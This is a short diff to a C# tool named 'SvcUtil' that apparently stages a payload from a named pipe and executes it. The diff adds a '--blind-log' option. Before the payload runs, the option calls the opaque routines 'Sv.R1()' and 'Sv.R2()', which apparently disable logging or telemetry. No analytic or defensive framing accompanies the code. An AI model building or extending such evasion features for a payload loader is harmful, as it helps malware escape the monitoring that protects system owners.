@@ -33,6 +33,7 @@ namespace SvcUtil
         private static bool _execAsm;
         private static string[] _asmArgs;
         private static bool _cleanup;
+        private static bool _blindLog;
 
         static void Main(string[] args)
         {
@@ -60,6 +61,7 @@ namespace SvcUtil
             _execAsm = false;
             _asmArgs = new string[0];
             _cleanup = false;
+            _blindLog = false;
 
             if (!ParseArgs(args))
                 return;
@@ -92,6 +94,12 @@ namespace SvcUtil
             {
                 payload = Stager.FromPipe(_stagePipe);
                 if (payload == null) return;
+            }
+
+            if (_blindLog)
+            {
+                Sv.R1();
+                Sv.R2();
             }
 
             if (payload != null)
@@ -321,6 +329,10 @@ namespace SvcUtil
 
                     case "--cleanup":
                         _cleanup = true;
+                        break;
+
+                    case "--blind-log":
+                        _blindLog = true;
                         break;
 
                     default:
